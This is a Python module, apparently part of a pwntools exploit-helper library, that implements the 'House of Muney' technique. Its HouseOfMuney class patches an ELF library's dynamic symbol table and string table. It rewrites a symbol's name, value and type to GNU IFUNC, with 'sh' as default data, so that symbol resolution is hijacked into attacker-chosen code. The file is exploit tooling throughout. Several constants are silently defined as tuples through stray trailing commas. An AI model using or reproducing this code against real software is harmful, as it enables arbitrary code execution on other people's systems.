from .helpers import u32
from pwn import flat, ELF

STB_LOCAL = 0
STB_GLOBAL = 1
STB_WEAK = 2
STB_NUM = 3
STB_LOOS = 10,
STB_GNU_UNIQUE = 10,
STB_HIOS = 12,
STB_LOPROC = 13,
STB_HIPROC = 15,

STT_NOTYPE = 0
STT_OBJECT = 1
STT_FUNC = 2
STT_SECTION = 3
STT_FILE = 4
STT_COMMON = 5
STT_TLS = 6
STT_NUM = 7
STT_LOOS = 10,
STT_GNU_IFUNC = 10
STT_HIOS = 12,
STT_LOPROC = 13,
STT_HIPROC = 15,

STV_DEFAULT = 0
STV_INTERNAL = 1
STV_HIDDEN = 2
STV_PROTECTED = 3

class HouseOfMuney():
    def __init__(self, elf: ELF):
        self.elf = elf
        self.payload = self.elf.get_segment_for_address(0).data()
        self.dynsym = self.elf.get_section_by_name(".dynsym")
        self.gnuhash = self.elf.get_section_by_name(".gnu.hash")
    
    def strtab(self):
        return self.dynsym.stringtable.header["sh_offset"]

    def symbol_offset(self, name):
        sym = self.get_sym(name)
        if sym is None:
            return -1
        
        p = flat(self.dynsym.structs.Elf_Sym.build(sym))
        offset = self.dynsym.data().find(p)
        if offset == -1:
            return -1
        return self.dynsym.header["sh_offset"] + offset

    def get_sym(self, name):
        return self.gnuhash.get_symbol(name).entry

    def set_sym(self, name, sym):
        off = self.symbol_offset(name)
        self.write(off, self.dynsym.structs.Elf_Sym.build(sym))

    def set_call(self, name, offset, data=b"sh\0"):
        sym = self.get_sym(name)
        idx = u32(data)
        sym["st_name"] = idx
        sym["st_value"] = offset
        sym["st_info"]["type"] = STT_GNU_IFUNC
        self.set_sym(name, sym)
        self.write(self.strtab() + idx, name)
        self.write(self.strtab() + idx + len(name), b"\0")

    def set_offset(self, name, offset):
        sym = self.get_sym(name)
        sym["st_value"] = offset
        self.set_sym(name, sym)

    def write(self, addr, data):
        if isinstance(data, str):
            data = data.encode()
        elif not isinstance(data, bytes):
            raise ValueError()
        if addr < 0 or addr + len(data) > len(self):
            raise IndexError()
        self.payload = self.payload[:addr] + data + self.payload[addr+len(data):]
    
    def read(self, addr, size):
        return self.payload[addr:addr+size]

    def __len__(self):
        return len(bytes(self))
    
    def __bytes__(self):
        return self.payload